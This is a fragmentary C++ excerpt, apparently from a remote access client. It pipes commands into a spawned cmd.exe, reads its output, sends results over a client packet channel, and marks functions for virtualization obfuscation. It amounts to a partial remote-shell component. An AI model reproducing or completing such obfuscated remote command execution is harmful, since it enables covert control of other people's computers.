...
std::string
CMD::readCMD() // read string from stdOut of cmd.exe	//IMPLEMENT AS THREAD
{
  VL_VIRTUALIZATION_BEGIN;
  if (cmdOpen) {
    ...
    while (intBytesAvailable > 0) // while there is something to read, read it
                                  // into buffer and append buffer to string
    {
...
void CMD::writeCMD(std::string command) // write a string to stdIn of cmd.exe
{
  ...
  if (cmdOpen) {
    ...
    command += '\n';     // append '\n' to simulate "ENTER"
    if (!WriteFile(g_hChildStd_IN_Wr, command.c_str(), command.size(),
                   &dwWritten, NULL))
      Client::clientptr->SendString("Couldn't write command '" + command +
                                        "' to stdIn.",
                                    PacketType::Warning);
  } else
...
void CMD::createChildProcess(
    std::string
        path) // creates child process ||copied from
              // https://msdn.microsoft.com/en-us/library/windows/desktop/ms682499(v=vs.85).aspx
              // ||
{
  VL_VIRTUALIZATION_BEGIN;
